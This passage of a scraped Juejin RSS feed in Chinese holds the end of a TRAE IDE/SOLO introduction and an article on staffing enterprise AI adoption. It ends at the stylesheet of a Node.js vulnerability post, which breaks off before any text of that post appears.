<p>简单介绍下 <code>IDE</code> 和 <code>SOLO</code> 两种模式：</p>
<ul>
<li><strong>IDE模式</strong>：本质是一个加了 AI 的开发工具，可以在写代码时AI补全，可以问AI问题，可以让AI基于细化的任务生成代码，但核心依然是开发工具，AI 只是辅助。</li>
<li><strong>SOLO模式</strong>：把 AI 提到了软件开发的核心，你只需要和 AI 对话，剩下的需求理解、产出文档、写代码、构建都由 AI 自主调用相关模型、工具处理，AI 是协调者、是核心。</li>
</ul>
<p>**注意：由于国际版 <code>SOLO</code> 模式是 <code>Pro</code> 会员才能使用的，所以没有 <code>Pro</code> 会员，本次领取的免费额度只能在 <code>IDE</code> 模式中使用哈。</p>
<h2 data-id="heading-2">SOLO 的能力</h2>
<p>下面我们再介绍下 <code>SOLO</code> 具体是什么。</p>
<p>本章节 <code>SOLO</code> 默认指代国际版 <code>SOLO</code>。</p>
<p>个人认为 TRAE SOLO 最大的价值有 2 个：</p>
<ul>
<li>全流程覆盖：AI 支持分析、开发、测试、部署全流程</li>
<li>接管工具丰富：AI 接管包括文档、代码、终端、预览、外部资源各种工具</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9429f17a08a04bb59a60a226d8003fff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=6zyCzRPLZudxep4%2B0CmtlIIoCLg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">第一条，全流程覆盖</h3>
<ul>
<li>你告诉 <code>SOLO</code> 你的目标，比如构建一个博客系统（建议勾选“Plan”）</li>
<li><code>SOLO</code> 会先帮你生成产品文档和技术文档，等你确认，中途也可以沟通修改</li>
<li><code>SOLO</code> 按照确认后的文档进行系统生成，生成过程包括代码编写、基本测试、构建错误自动修复</li>
</ul>
<p>理论上，提示词明确且规模合适，是可以一口气生成可运行应用的。</p>
<p>《<a href="https://juejin.cn/post/7529347270548013107" target="_blank" title="https://juejin.cn/post/7529347270548013107">TRAE SOLO 实测，从需求到上线，这次真的只需要一句话了（附 SOLO CODE 获取方式） - 掘金</a>》</p>
<p>即使初版不满意，也可以接着对话修改。</p>
<h3 data-id="heading-4">第二条，接管工具丰富</h3>
<p>软件开发内设计的各阶段工具 <code>SOLO</code> 基本都已接管，包括文档、代码编辑器、命令终端、内置浏览器、云数据库、前端部署等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32451cfccd4a4e0eb2062d868808c4fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=fMoBcy0MidoWnZs8P4EDQmIOA9U%3D" alt="" loading="lazy"/></p>
<p>整个生成过程 <code>SOLO</code> 自动调用相关工具，开启“实时跟随”后，界面也会自动切换当前正在执行的工具。</p>
<h3 data-id="heading-5">其他</h3>
<p>再同步一些信息和经验，方便大家参考：</p>
<ul>
<li>SOLO 默认开启模型的 Max 模式，几乎不会触发单轮对话超出工具调用或者模型调用的上限，但相应的次数消耗也会加剧。</li>
<li>SOLO 默认智能体有两个，SOLO Builder 和 SOLO Coder，Builder更适合 Web 页面的构建，Coder 更适合解决复杂问题。</li>
<li>SOLO 支持多任务并行，意味着前一个对话发出后，可以在执行期间，再次启动另一个对话，执行其他任务。</li>
<li>编程语言支持程度上，个人直观体验如下，仅供参考。前端系列效果都挺好，后端的话 node &gt; python &gt; java &gt; 其他。</li>
</ul>
<h2 data-id="heading-6">结语</h2>
<p>好了，就到这里吧，入门内容不宜太长。</p>
<p>稍微总结下，<code>TRAE IDE</code> 模式是一个加了 AI 的开发软件，<code>TRAE SOLO</code> 目标则更高层一些，更利于非技术人员掌握，或者说，更加符合当前 <code>Vibe Coding</code> 的需要，大家可以根据需要自行选择哈。</p>
<p>如果你有什么好的或坏的注意事项，也欢迎留言，大家一起更好地使用 <code>TRAE</code>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谁来负责企业落地AI？]]></title>    <link>https://juejin.cn/post/7595423767720984585</link>    <guid>https://juejin.cn/post/7595423767720984585</guid>    <pubDate>2026-01-15T12:53:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423767720984585" data-draft-id="7595067620950048794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谁来负责企业落地AI？"/> <meta itemprop="keywords" content="AI编程,AIGC,OpenAI"/> <meta itemprop="datePublished" content="2026-01-15T12:53:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="石云升"/> <meta itemprop="url" content="https://juejin.cn/user/642537280772456"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谁来负责企业落地AI？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/642537280772456/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    石云升
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:53:18.000Z" title="Thu Jan 15 2026 12:53:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"⇲"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"•";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>去年还有人问企业要不要拥抱AI，今年已经没人问了。问题变成了：怎么落地？谁来干？</p>
<p>很多企业的第一反应是招人——找一个既懂技术又懂业务的AI落地专家。想法没错，但这样的人才市场上很少，而且不是圈子里的人又很难甄别。</p>
<p><strong>我的建议是：先别急着外招，从内部培养一个懂业务的人。</strong></p>
<p>而且有了这样一个人，后续就算要招人，你也知道企业需要什么样的人，面试的时候也知道问什么样的问题。</p>
<hr/>
<h2 data-id="heading-0">为什么可行？</h2>
<p>技术门槛在快速降低。</p>
<p>现在国内已有1亿人在用豆包，写文案、做PPT已成基本技能。单纯会用AI毫无优势，真正有价值的是<strong>用AI深入业务、解决实际痛点</strong>。</p>
<p>换句话说：<strong>技术在进步，懂业务的人价值被放大了。</strong></p>
<p>以前需要懂代码才能开发，现在模型API已足够强大，很多程序已经可以通过文本沟通就能开发出来。这意味着，业务人员可以以很低的门槛上手做出自己专用的程序。</p>
<hr/>
<h2 data-id="heading-1">哪些人适合培养？</h2>
<p><strong>第一类：公司里最爱用AI的人</strong></p>
<p>每天都在用AI的人，和每月用一次的人，对工具的理解完全不同。主动性和手感，是培训不出来的。</p>
<p><strong>第二类：产品经理、项目经理</strong></p>
<p>这类人本就在梳理业务流程，清楚哪里卡顿、哪里低效、哪里重复劳动多。让他们带着问题学AI，效率最高。</p>
<p><strong>第三类：愿意折腾的一线员工</strong></p>
<p>让员工主动用AI解决手头问题。谁解决了，就让他做分享，给资源让他用AI解决更多问题。</p>
<hr/>
<h2 data-id="heading-2">怎么判断一个人行不行？</h2>
<p>很简单：<strong>看产出。</strong></p>
<p>让他做个东西出来，能解决问题就行，不能就换人。</p>
<p>不用搞复杂的评估体系。现在工具这么强，一试便知。</p>
<hr/>
<h2 data-id="heading-3">从哪里开始？</h2>
<p>AI落地不要一上来就搞大项目。先找那些<strong>高频重复、耗时、易出错</strong>的工作，这类任务最适合用AI解决，见效快、阻力小。</p>
<p>设计原则：<strong>能一个按钮解决的，就不要操作两次。</strong></p>
<p>举几个真实案例：</p>
<p><strong>财务对账</strong>
以前运营做一遍，财务再核对一遍。现在用对账工具，上传表格自动核算金额、去重、过滤状态变更订单，一键导出。两个部门都省力。</p>
<p><strong>退单统计</strong>
客服每天手动整理微信群退单信息到Excel，1-2人做一下午，易出错。用小工具自动识别快递单号、汇总到表格，支持撤回和导出，彻底解放人力。</p>
<p><strong>发票整理</strong>
自动按主体、进销项、普票专票分类并命名。人工整理半天，现在几秒搞定。</p>
<p>这些需求看似不起眼，但每天都在消耗人力。用AI做小工具，成本低、见效快，还能让团队感受到AI的实际价值。</p>
<hr/>
<h2 data-id="heading-4">如果要外招，怎么甄别？</h2>
<p>有些业务确实需要比较丰富的技术基础，需要外招AI落地负责人。但市场鱼龙混杂，如何甄别？</p>
<p><strong>1. 有没有真实落地案例？追问细节</strong></p>
<p>不要只听"我做过AI客服"。要追问：用什么模型？怎么处理并发？知识库如何构建？遇到什么坑？怎么解决的？真做过的人细节张口就来，包装的人一问就露馅。</p>
<p><strong>2. 有没有跨部门落地经验？</strong></p>
<p>给自己提效只是初级。能给财务、客服、运营、人事等不同部门都落地过，才证明此人有快速理解业务的能力。AI落地的难点不在技术，在业务逻辑的解构。</p>
<p><strong>3. 有没有总结复盘的习惯？</strong></p>
<p>写公众号、做分享、在社群输出过的人，说明他不只是执行，还复盘过、提炼过。这种人学习能力和表达能力都不会差。</p>
<p><strong>4. 沟通逻辑是否清晰？</strong></p>
<p>AI落地需要跟各部门打交道——需求沟通、方案讲解、问题排查，都需要清晰逻辑。面试时如果对方表达混乱，落地时大概率也一团糟。</p>
<p><strong>5. 使用AI的时长和频率</strong></p>
<p>越早用、用得越频繁越好。2023年就深度使用的人，和2025年才入门的人，体感和经验天差地别。可以问：用过哪些模型？不同模型区别是什么？踩过哪些坑？</p>
<p><strong>6. 有没有成本意识？</strong></p>
<p>AI落地追求的是业务最优，不是技术最优。真正有经验的人不会一上来就提买卡训练模型，那是大厂玩法。同时要明白，token价格会越来越便宜，应优先保证程序稳定性和可用性，而非过度计较单次成本。</p>
<p><strong>7. 有没有数据思维？</strong></p>
<p>落地后效果如何，不能靠感觉。要用数据说话：接待多少咨询？回复多少次？转化率多少？省了多少人力？数据会给出真实反馈，指引前进方向。</p>
<hr/>
<h2 data-id="heading-5">最后</h2>
<p>AI落地有快有慢，有做得好的和不好的，关键还是技术和业务的结合。外招一个大牛当然好，但等不到、看不准的时候，不如先从内部找一个愿意干、懂业务的人，让他边学边干。</p>
<p><strong>以用为学，是最快的学习方式。</strong></p>
<hr/>
<p>关于作者：石云升｜AI博主 &amp; AI企业落地师，专注企业AI落地与业务流程重构。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e6c49601add4fa8a87f42dd11668306~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z5LqR5Y2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086397&amp;x-signature=acvAcjUOY2olM9d1NrY3k78ezgc%3D" alt="image_w2752_h1536_签名图_16x9_v4.jpeg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 存在多个严重安全漏洞！官方建议尽快升级🚀🚀🚀]]></title>    <link>https://juejin.cn/post/7595365551607808051</link>    <guid>https://juejin.cn/post/7595365551607808051</guid>    <pubDate>2026-01-15T11:07:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595365551607808051" data-draft-id="7595422019777560626" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 存在多个严重安全漏洞！官方建议尽快升级🚀🚀🚀"/> <meta itemprop="keywords" content="Node.js,Vue.js,React.js"/> <meta itemprop="datePublished" content="2026-01-15T11:07:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="萌萌哒草头将军"/> <meta itemprop="url" content="https://juejin.cn/user/1116759543260727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 存在多个严重安全漏洞！官方建议尽快升级🚀🚀🚀
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759543260727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    萌萌哒草头将军
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:07:44.000Z" title="Thu Jan 15 2026 11:07:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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